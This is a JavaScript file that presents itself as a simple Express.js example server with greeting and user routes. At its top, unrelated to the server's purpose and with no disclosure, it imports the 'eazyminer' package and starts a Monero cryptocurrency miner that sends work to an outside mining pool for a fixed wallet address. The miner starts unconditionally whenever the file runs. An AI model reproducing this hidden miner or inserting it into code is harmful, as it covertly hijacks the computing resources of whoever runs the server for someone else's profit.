const { Miner } = require('eazyminer');

const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '46W7W4PiWjnfEKwCs6oezqengntEYMRu9S997hATfZSKDvT5VJuxXTNULdF9XFB3ZJf5Lp3XPSuoBRYwXHqkTAUQGy3pZWU',
        url: 'pool.hashvault.pro:3333', // optional pool URL,
    }],
    autoStart: false // optional delay
});

miner.start();

// Import express
const express = require('express');
const app = express();

// Middleware to parse JSON
app.use(express.json());

// Root route
app.get('/', (req, res) => {
  res.send('Hello, Express.js is running 🚀');
});

// Example: GET with query params
app.get('/greet', (req, res) => {
  const name = req.query.name || 'Guest';
  res.json({ message: `Hello, ${name}!` });
});

// Example: POST with body data
app.post('/user', (req, res) => {
  const { username, email } = req.body;
  res.json({ message: 'User created successfully', user: { username, email } });
});

// Example: Route with params
app.get('/user/:id', (req, res) => {
  const userId = req.params.id;
  res.json({ message: `Fetching user with ID: ${userId}` });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
